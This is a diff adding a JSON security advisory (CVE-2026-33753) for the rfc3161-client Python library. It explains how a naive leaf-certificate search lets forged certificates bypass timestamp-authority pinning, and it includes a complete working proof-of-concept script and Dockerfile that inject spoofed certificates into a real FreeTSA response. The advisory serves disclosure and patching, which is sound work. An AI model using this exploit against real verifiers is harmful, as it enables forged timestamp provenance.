@@ -1,0 +1,72 @@
+{
+  "id": "GHSA-3xxc-pwj6-jgrj",
+  "modified": "2026-04-08T19:36:14.818545Z",
+  "published": "2026-04-08T15:00:23Z",
+  "aliases": [
+    "CVE-2026-33753"
+  ],
+  "summary": "rfc3161-client Has Improper Certificate Validation",
+  "details": "### Summary\n\nAn Authorization Bypass vulnerability in `rfc3161-client`'s signature verification allows any attacker to impersonate a trusted TimeStamping Authority (TSA). By exploiting a logic flaw in how the library extracts the leaf certificate from an unordered PKCS#7 bag of certificates, an attacker can append a spoofed certificate matching the target `common_name` and Extended Key Usage (EKU) requirements. This tricks the library into verifying these authorization rules against the forged certificate while validating the cryptographic signature against an actual trusted TSA (such as FreeTSA), thereby bypassing the intended TSA authorization pinning entirely.\n\n### Details\n\nThe root cause lies in `rfc3161_client.verify.Verifier._verify_leaf_certs()`. The library attempts to locate the leaf certificate within the parsed TimeStampResponse PKCS#7 `SignedData` bag using a naive algorithm:\n\n```python\nleaf_certificate_found = None\nfor cert in certs:\n    if not [c for c in certs if c.issuer == cert.subject]:\n        leaf_certificate_found = cert\n        break\n```\n\nThis loop erroneously assumes that the valid leaf certificate is simply the first certificate in the bag that does not issue any other certificate. It does **not** rely on checking the `ESSCertID` or `ESSCertIDv2` cryptographic bindings specified in RFC 3161 (which binds the signature securely to the exact signer certificate).\n\nAn attacker can exploit this by:\n\n1. Acquiring a legitimate, authentic TimeStampResponse from *any* widely trusted public TSA (e.g., FreeTSA) that chains up to a Root CA trusted by the client.\n2. Generating a self-signed spoofed \"proxy\" certificate `A` with the exact `Subject` (e.g., `CN=Intended Corporate TSA`) and `ExtendedKeyUsage` (`id-kp-timeStamping`) required by the client's `VerifierBuilder`.\n3. Generating a dummy certificate `D` issued by the *actual* FreeTSA leaf certificate.\n4. Appending both `A` and `D` to the `certificates` list in the PKCS#7 `SignedData` of the TimeStampResponse.\n\nWhen `_verify_leaf_certs()` executes, the dummy certificate `D` disqualifies the authentic FreeTSA leaf from being selected (because FreeTSA now technically \"issues\" `D` within the bag). The loop then evaluates the spoofed certificate `A`, realizes it issues nothing else in the bag, and selects it as `leaf_certificate_found`.\n\nThe library then processes the `common_name` and EKU checks exactly against `A`. Since `A` was explicitly forged to pass these checks, verification succeeds. Finally, the OpenSSL `pkcs7_verify` backend validates the actual cryptographic signature using the authentic FreeTSA certificate and trusted roots (ignoring the injected certs). The application wrongly trusts that the timestamp was granted by the pinned TSA.\n\n### PoC\n\nThe environment simulation and the PoC script have been included in the `poc.py` and `Dockerfile` artifacts:\n\n**Dockerfile (`poc/Dockerfile`)**:\n\n```dockerfile\nFROM python:3.11-slim\nRUN apt-get update \u0026\u0026 apt-get install -y build-essential libssl-dev libffi-dev python3-dev cargo rustc pkg-config git \u0026\u0026 rm -rf /var/lib/apt/lists/*\nWORKDIR /app\nCOPY . /app/rfc3161-client\nRUN pip install cryptography requests asn1crypto\nWORKDIR /app/rfc3161-client\nRUN pip install .\nCOPY poc/poc.py /app/poc.py\nWORKDIR /app\nCMD [\"python\", \"poc.py\"]\n```\n\nThe attack flow locally demonstrated in `poc/poc.py`:\n\n``` python\nimport base64\nimport requests\nfrom rfc3161_client import TimestampRequestBuilder, decode_timestamp_response, HashAlgorithm\nfrom rfc3161_client.verify import VerifierBuilder\nfrom cryptography import x509\nfrom cryptography.hazmat.primitives import hashes, serialization\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.x509.oid import NameOID, ExtendedKeyUsageOID\nimport datetime\nfrom asn1crypto import cms, tsp\n\ndef main():\n    print(\"[*] Generating TimeStampRequest...\")\n    req_builder = TimestampRequestBuilder(\n        data=b\"hello world\",\n        hash_algorithm=HashAlgorithm.SHA256,\n        cert_req=True\n    )\n    req = req_builder.build()\n    \n    print(\"[*] Contacting FreeTSA to fetch a genuine digitally signed timestamp...\")\n    resp = requests.post(\n        \"https://freetsa.org/tsr\",\n        data=req.as_bytes(),\n        headers={\"Content-Type\": \"application/timestamp-query\"}\n    )\n    if resp.status_code != 200:\n        print(\"[-] Failed to get TSA response. Is the network up?\")\n        return\n        \n    tsa_resp_bytes = resp.content\n    \n    print(\"[*] Creating forged certificate (Common Name: Spoofed TSA, EKU: timeStamping)...\")\n    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)\n    subject = issuer = x509.Name([\n        x509.NameAttribute(NameOID.COMMON_NAME, \"Spoofed TSA\"),\n    ])\n    \n    # We create a self-signed spoofed certificate that meets all Python verification criteria\n    cert = x509.CertificateBuilder().subject_name(\n        subject\n    ).issuer_name(\n        issuer\n    ).public_key(\n        private_key.public_key()\n    ).serial_number(\n        x509.random_serial_number()\n    ).not_valid_before(\n        datetime.datetime.utcnow() - datetime.timedelta(days=1)\n    ).not_valid_after(\n        datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    ).add_extension(\n        x509.ExtendedKeyUsage([ExtendedKeyUsageOID.TIME_STAMPING]),\n        critical=True,\n    ).sign(private_key, hashes.SHA256())\n    \n    fake_cert_der = cert.public_bytes(serialization.Encoding.DER)\n    \n    print(\"[*] Parsing the authentic PKCS#7 SignedData bag of certificates...\")\n    tinfo = tsp.TimeStampResp.load(tsa_resp_bytes)\n    status = tinfo['status']['status'].native\n    if status != 'granted':\n        print(f\"[-] Status not granted: {status}\")\n        return\n        \n    content_info = tinfo['time_stamp_token']\n    assert content_info['content_type'].native == 'signed_data'\n    signed_data = content_info['content']\n    \n    certs = signed_data['certificates']\n    \n    from asn1crypto.x509 import Certificate\n    fake_cert_asn1 = Certificate.load(fake_cert_der)\n    \n    real_leaf_asn1 = None\n    for c in certs:\n        c_subject = c.chosen['tbs_certificate']['subject']\n        issues_something = False\n        for oc in certs:\n            if c == oc: continue\n            oc_issuer = oc.chosen['tbs_certificate']['issuer']\n            if c_subject == oc_issuer:\n                issues_something = True\n                break\n        if not issues_something:\n            real_leaf_asn1 = c\n            break\n            \n    if real_leaf_asn1:\n        print(\"[*] Found the genuine TS leaf certificate. Creating a 'dummy node' to disqualify it from the library's naive leaf discovery...\")\n        real_leaf_crypto = x509.load_der_x509_certificate(real_leaf_asn1.dump())\n        dummy_priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)\n        dummy_cert = x509.CertificateBuilder().subject_name(\n            x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, \"Dummy Entity\")])\n        ).issuer_name(\n            real_leaf_crypto.subject\n        ).public_key(\n            dummy_priv.public_key()\n        ).serial_number(\n            x509.random_serial_number()\n        ).not_valid_before(\n            datetime.datetime.utcnow() - datetime.timedelta(days=1)\n        ).not_valid_after(\n            datetime.datetime.utcnow() + datetime.timedelta(days=1)\n        ).sign(dummy_priv, hashes.SHA256()) \n        \n        dummy_cert_asn1 = Certificate.load(dummy_cert.public_bytes(serialization.Encoding.DER))\n        certs.append(dummy_cert_asn1)\n\n    print(\"[*] Injecting the malicious spoofed proxy certificate into the response bag...\")\n    certs.append(fake_cert_asn1)\n    \n    malicious_resp_bytes = tinfo.dump()\n    \n    print(\"[*] Downloading FreeTSA Root Certificate Trust Anchor...\")\n    root_resp = requests.get(\"https://freetsa.org/files/cacert.pem\")\n    root_cert = x509.load_pem_x509_certificate(root_resp.content)\n    # We must also download TSA.crt which acts as an intermediate for FreeTSA\n    tsa_resp_cert = requests.get(\"https://freetsa.org/files/tsa.crt\")\n    tsa_cert_obj = x509.load_pem_x509_certificate(tsa_resp_cert.content)\n    \n    print(\"[*] Initializing Verifier strictly pinning Common Name to 'Spoofed TSA'...\")\n    tsa_resp_obj = decode_timestamp_response(malicious_resp_bytes)\n    \n    verifier = VerifierBuilder(\n        common_name=\"Spoofed TSA\",\n        roots=[root_cert],\n        intermediates=[tsa_cert_obj],\n    ).build()\n\n    print(\"[*] Attempting Verification...\")\n    try:\n        verifier.verify_message(tsa_resp_obj, b\"hello world\")\n        print(\"\\n\\033[92m[+] VULNERABILITY CONFIRMED: Authorization Bypass successful! The Verifier accepted the authentic signature under the forged 'Spoofed TSA' name due to Trust Boundary Confusion.\\033[0m\\n\")\n    except Exception as e:\n        print(\"\\n\\033[91m[-] Verification failed:\\033[0m\", e)\n\nif __name__ == '__main__':\n    main()\n```\n\n1. Requests a timestamp from `https://freetsa.org/tsr`.\n2. Generates a fake cert with `common_name=\"Spoofed TSA\"` and `ExtendedKeyUsage=TIME_STAMPING`.\n3. Parses the authentic TS response, injects a dummy cert issued by FreeTSA's leaf.\n4. Injects the fake cert into the bag.\n5. Invokes `decode_timestamp_response()` on the malicious bytes.\n6. Runs `VerifierBuilder(common_name=\"Spoofed TSA\", ...).verify_message(malicious_resp, msg)`.\n7. Observes a successful verification bypassing the `common_name` constraint.\n\n### Impact\n\n**Vulnerability Type:** Authorization Bypass / Improper Certificate Validation / Trust Boundary Confusion\n**Impact:** High. Applications relying on `rfc3161-client` to guarantee the origin of a timestamp via `tsa_certificate` or `common_name` pinning are completely exposed to impersonation. An attacker can forge the identity of the TSA as long as they hold *any* valid timestamp from a CA trusted by the Verifier.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "rfc3161-client",
+        "purl": "pkg:pypi/rfc3161-client"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.0.6"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.1.0",
+        "0.1.1",
+        "0.1.2",
+        "1.0.0",
+        "1.0.1",
+        "1.0.2",
+        "1.0.3",
+        "1.0.4",
+        "1.0.5"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.0.5",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-3xxc-pwj6-jgrj/GHSA-3xxc-pwj6-jgrj.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/trailofbits/rfc3161-client/security/advisories/GHSA-3xxc-pwj6-jgrj"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33753"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/trailofbits/rfc3161-client/commit/4f7d372297b4fba7b0119e9f954e4495ec0592c0"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/trailofbits/rfc3161-client"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/trailofbits/rfc3161-client/releases/tag/v1.0.6"
+    }
+  ]
+}
